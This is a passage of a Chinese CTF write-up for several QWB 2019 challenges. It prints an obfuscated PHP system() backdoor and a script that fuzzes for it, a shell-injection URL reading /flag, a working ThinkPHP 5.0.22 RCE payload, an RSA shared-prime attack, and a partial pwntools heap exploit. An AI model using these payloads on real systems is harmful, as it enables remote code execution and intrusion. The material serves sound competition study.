        <span class="token keyword">return</span> <span class="token function">matchPattern</span><span class="token punctuation">(</span><span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">matchPattern</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;/path/to/local/webserver/&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$dirs</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$cnt</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;xk0SzyKwfzw.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;\n&quot;</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$line</span> <span class="token keyword">as</span> <span class="token variable">$linek</span> <span class="token operator">=&gt;</span> <span class="token variable">$linev</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$linev</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">matchPattern</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'*$_GET[*\'*\'*]*'</span><span class="token punctuation">,</span> <span class="token variable">$linev</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">matchPattern</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'*$_POST[*\'*\'*]*'</span><span class="token punctuation">,</span> <span class="token variable">$linev</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//if(matchPattern('if*(*==*)', trim($line[$linek - 1]))) continue;</span>
        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$word</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">,</span> <span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token function">mb_strrpos</span><span class="token punctuation">(</span><span class="token variable">$linev</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;]&quot;</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'$_POST'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span> <span class="token operator">?</span> <span class="token string double-quoted-string">&quot;post&quot;</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">&quot;get&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\''</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[\\\''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$word</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[\''</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;[<span class="token interpolation"><span class="token variable">$method</span></span>]\t&quot;</span> <span class="token operator">.</span> <span class="token function">str_pad</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
        <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'echo &quot;windowslinuxmac&quot;;'</span><span class="token punctuation">;</span>
        <span class="token variable">$cnt</span><span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">==</span> <span class="token string double-quoted-string">&quot;post&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$http</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;http&quot;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
                <span class="token string single-quoted-string">'method'</span> <span class="token operator">=&gt;</span> <span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'header'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'Content-Type: application/x-www-form-urlencoded; charset=utf-8'</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'content'</span> <span class="token operator">=&gt;</span> <span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
                    <span class="token variable">$func</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span>
                <span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token comment">//var_dump($http[&quot;http&quot;]);</span>
            <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token function">stream_context_create</span><span class="token punctuation">(</span><span class="token variable">$http</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;http://localhost/web2/&quot;</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;xk0SzyKwfzw.php&quot;</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//echo &quot;$result\n&quot;;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;http://localhost/web2/&quot;</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;xk0SzyKwfzw.php&quot;</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;?&quot;</span> <span class="token operator">.</span> <span class="token variable">$func</span> <span class="token operator">.</span> <span class="token string double-quoted-string">&quot;=&quot;</span> <span class="token operator">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">//echo $result.PHP_EOL;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;请求失败！\n&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;windowslinuxmac&quot;</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Found!!!\n&quot;</span><span class="token punctuation">;</span>
                <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;[cnt] &quot;</span> <span class="token operator">.</span> <span class="token variable">$cnt</span> <span class="token operator">.</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span>
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br></div></div><p>找到发现在 300 行左右的这段代码是一个非常奇怪的拼接，然后拼成了 system 并执行。</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token variable">$XnEGfa</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Efa5BVG'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>
<span class="token variable">$aYunX</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;sY&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$aYunX</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">&quot;stEmXnsTcx&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$aYunX</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Xn'</span><span class="token punctuation">,</span> <span class="token variable">$aYunX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$kDxfM</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">stdClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$kDxfM</span><span class="token operator">-&gt;</span><span class="token property">gHht</span> <span class="token operator">=</span> <span class="token variable">$aYunX</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token variable">$kDxfM</span><span class="token operator">-&gt;</span><span class="token property">gHht</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$XnEGfa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>尝试使用 <code>$_GET['Efa5BVG']</code> 参数进行 shell 注入 <code>cat /flag</code>，成功。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>http://117.78.60.139:32435/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/assets/img/2019-qwb-3.da28d748.png" alt=""></p> <h2 id="强网先锋-上单"><a href="#强网先锋-上单" class="header-anchor">#</a> 强网先锋-上单</h2> <p>找到网页之后看到<code>这个 5.0.22的二次开发版本由 Smity 独家赞助发布</code>，thinkphp 5.0.22，emmmmm，自带 RCE，直接构造<code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code>，拿到<code>flag{90226d3dd64b8dbddd602e18d8af8dbb}</code>。</p> <h2 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="header-anchor">#</a> 强网先锋-辅助</h2> <p>给出 RSA 代码</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;flag&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>bytes_to_long
p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">65537</span>
n<span class="token operator">=</span>p<span class="token operator">*</span>q
m<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span> c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n

p<span class="token operator">=</span>getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
e<span class="token operator">=</span><span class="token number">65537</span>
n<span class="token operator">=</span>p<span class="token operator">*</span>q
m<span class="token operator">=</span>bytes_to_long<span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>
c<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span> c<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>发现<code>n1=p1*q</code>，<code>n2=p2*q</code>，那么<code>gcd(n1,n2) = q</code>，即可分别把两个 N 的 p，q 都算出来。写一个解密脚本</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_v1_5<span class="token punctuation">,</span> PKCS1_OAEP
<span class="token keyword">import</span> gmpy2
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode
n1 <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
n2 <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
p1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>n1<span class="token punctuation">,</span> n2<span class="token punctuation">)</span>
q1 <span class="token operator">=</span> n1 <span class="token operator">/</span> p1
e <span class="token operator">=</span> <span class="token number">65537</span>
phin <span class="token operator">=</span> <span class="token punctuation">(</span>p1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q1 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phin<span class="token punctuation">)</span>
cipher <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
plain <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n1<span class="token punctuation">)</span>
plain <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>plain<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
    plain <span class="token operator">=</span> <span class="token string">'0'</span> <span class="token operator">+</span> plain
<span class="token keyword">print</span> plain<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>得到<code>flag{i_am_very_sad_233333333333}</code></p> <h2 id="强网先锋-打野"><a href="#强网先锋-打野" class="header-anchor">#</a> 强网先锋-打野</h2> <p>一张 bmp 图片，使用 zsteg 爆破出来 LSB 隐写<code>b1,msb,bY: qwxf{you_say_chick_beautiful?}</code></p> <h2 id="强网先锋-ap"><a href="#强网先锋-ap" class="header-anchor">#</a> 强网先锋-AP</h2> <p>泄漏 puts 地址，查找 libc 版本为<code>libc6_2.23-0ubuntu10_amd64</code>,然后打 one_gadget。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python2</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from FILE import *</span>

<span class="token comment">#context.log_level = 'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span> <span class="token string">'-e'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'amd64'</span><span class="token punctuation">,</span><span class="token string">'x86_32'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

filename <span class="token operator">=</span> <span class="token string">&quot;./task_main&quot;</span>
glibc_version <span class="token operator">=</span> <span class="token string">'2.24'</span>
address <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'address'</span><span class="token punctuation">:</span> <span class="token string">'117.78.60.139'</span><span class="token punctuation">,</span> <span class="token string">'port'</span><span class="token punctuation">:</span> <span class="token number">30600</span><span class="token punctuation">}</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/{}/libc.so.6'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>glibc_version<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">attach</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> breaks<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">&quot;b *%s&quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> breaks<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>address<span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> address<span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">GET</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;&gt;&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">OPEN</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;&gt;&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;2&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;?&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;!&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">CHANGE</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>length<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#p.interactive()</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;&gt;&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;?&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;name:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    GET<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">&quot;A&quot;</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    GET<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">&quot;B&quot;</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    CHANGE<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeefdeadbeef</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\x68'</span><span class="token punctuation">)</span>
    puts_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>OPEN<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 泄露PUTS</span>
    libc_addr<span class="token operator">=</span>puts_addr<span class="token operator">-</span><span class="token number">0x06f690</span>
    success<span class="token punctuation">(</span><span class="token string">&quot;puts_addr: &quot;</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    success<span class="token punctuation">(</span><span class="token string">&quot;libc_addr: &quot;</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
